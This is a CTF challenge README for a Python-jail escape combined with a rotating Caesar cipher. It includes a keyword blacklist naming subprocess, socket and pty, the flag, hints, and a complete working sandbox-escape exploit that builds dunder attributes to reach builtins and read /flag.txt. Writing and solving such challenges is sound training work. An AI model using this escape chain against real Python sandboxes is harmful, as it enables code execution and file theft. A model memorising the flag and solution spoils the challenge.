# Cipher-Prison (PyJail 2)

A CTF challenge combining a Python jail with a dynamic rotating Caesar cipher.

## Challenge Info

| Field | Value |
|-------|-------|
| **Name** | Cipher-Prison |
| **Category** | misc / pyjail |
| **Difficulty** | Medium-Hard (400-450 pts) |
| **Flag** | `DSCCTF{dyn4m1c_k3ysw4p_j41l_br34k3r_2026}` |
| **Port** | 1337 |

## Challenge Description (for CTF platform)

```
🔐 Cipher-Prison [misc/jail] - 450 pts

Welcome to the prison where words are twisted and secrets are scrambled.

Something feels... off. Your keyboard doesn't work the way it should.
The ancient Romans might know what's happening here.

⚠️ WARNING: Speak forbidden words and face instant termination.

Can you escape and claim the flag?

nc ctf.yourserver.com 1337

Author: pranav
```

---

## Deployment

### Using Docker (Recommended)
```bash
cd cipher-prison
docker-compose up -d --build
```

### Using socat (Quick testing)
```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"python3 /path/to/jail.py"
```

### Using ncat
```bash
ncat -lvnkp 1337 --sh-exec "python3 /path/to/jail.py"
```

---

## Challenge Mechanics

### 1. The Cipher (Rotating Caesar) - INPUT ONLY

- **Alphabet**: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789` (62 chars)
- **Initial rotation**: 0
- **Rotation step**: +7 after each command
- **Input**: Encoded by player, decoded by server
- **Output**: Displayed NORMALLY (not scrambled!)

**Example at rotation 7:**
```
To execute: print(1+1)
You must type: wypuA(1+1)
```

### 2. Blacklisted Words (INSTANT DEATH)

Using these words **immediately kills the connection**:
- `import`, `exec`, `eval`, `compile`, `input`
- `subprocess`, `sys`, `socket`, `pty`, `posix`
- `locals`, `vars`, `dir`, `environ`
- And more...

### 3. Blocked Characters

- `_` (underscore) - **The key restriction!** Must use `chr(95)` instead

### 4. Allowed (Intentionally for solve path)

- `getattr`, `chr`, `ord`, `str`, `type`
- `class`, `base`, `mro`, `subclasses`, `init`
- `globals`, `open`, `os`, `builtins`, `flag`
- `.` (dot), `[`, `]` (brackets)

### 5. Variables Persist

Variables created in one command are available in subsequent commands.

---

## Intended Solution

### Key Insight
`_` is blocked, but `chr(95)` returns `'_'`, allowing us to build dunder attributes!

### Encoder Function

```python
ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def encode(text, rotation):
    rotated = ALPHABET[rotation:] + ALPHABET[:rotation]
    return text.translate(str.maketrans(ALPHABET, rotated))
```

### Step-by-Step Solution

| Rot | What to Execute | What to Type |
|-----|-----------------|--------------|
| 0 | `u=chr(95)*2` | `u=chr(95)*2` |
| 7 | `c=getattr("",u+"class"+u)` | `j=nlAhAAy("",B+"jshzz"+B)` |
| 14 | `b=getattr(c,u+"bases"+u)[0]` | `p=usHoHHF(q,I+"poGsG"+I)[e]` |
| 21 | `s=getattr(b,u+"subclasses"+u)()` | `N=BzOvOOM(w,P+"NPwxGvNNzN"+P)()` |
| 28 | `w=s[158]` | `Y=U[txA]` |
| 35 | `g=getattr(getattr(w,u+"init"+u),u+"globals"+u)` | `P=PN2J220(PN2J220(5,3+"RWR2"+3),3+"PUXKJU1"+3)` |
| 42 | `print(g[u+"builtins"+u]["open"]("/flag.txt").read())` | `57Y39(W[a+"RaY19Y38"+a]["45U3"]("/V1QW.9d9").7UQT())` |

**Note:** Index 158 is for `os._wrap_close`. This may vary by Python version. Step 4 can be used to find the correct index:
```
print([i for i,x in enumerate(s) if "wrap" in str(x)])
```

### Full Automated Exploit

```bash
echo 'u=chr(95)*2
j=nlAhAAy("",B+"jshzz"+B)
p=usHoHHF(q,I+"poGsG"+I)[e]
N=BzOvOOM(w,P+"NPwxGvNNzN"+P)()
Y=U[txA]
P=PN2J220(PN2J220(5,3+"RWR2"+3),3+"PUXKJU1"+3)
57Y39(W[a+"RaY19Y38"+a]["45U3"]("/V1QW.9d9").7UQT())' | nc TARGET 1337
```

**Output:**
```
DSCCTF{dyn4m1c_k3ysw4p_j41l_br34k3r_2026}
```

---

## Files

```
cipher-prison/
├── challenge/
│   ├── jail.py              # Main challenge
│   ├── flag.txt             # DSCCTF{dyn4m1c_k3ysw4p_j41l_br34k3r_2026}
│   └── description.md       # Challenge description for CTF platform
├── solve/
│   └── solver.py            # Encoder + automated solver
├── Dockerfile
├── docker-compose.yml
├── xinetd.conf
├── start.sh
└── README.md
```

---

## Hints for Players (optional, release progressively)

1. **Hint 1** (free): "Output isn't scrambled, only input!"
2. **Hint 2** (50 pts): "Caesar cipher, +7 rotation each command"
3. **Hint 3** (100 pts): "chr(95) == '_'"
4. **Hint 4** (150 pts): "getattr is your friend for accessing attributes"

---

## Adjusting Difficulty

### Make Easier
- Reduce rotation step from 7 to 0 (no cipher at all)
- Provide encoder script in description

### Make Harder
- Block `chr` (requires unicode bypass)
- Block `.` (requires `getattr` chaining only)
- Add output scrambling back
- Shorter input limit (100 chars is already tight)

---

## Testing Checklist

- [x] Banner displays correctly
- [x] Cipher encoding/decoding works
- [x] Blacklisted words kill connection
- [x] `_` character blocked
- [x] `.` and `[]` allowed
- [x] Variables persist between commands
- [x] getattr, chr, ord available
- [x] Output is NOT scrambled
- [x] Flag readable at /flag.txt
- [x] Full exploit tested and working
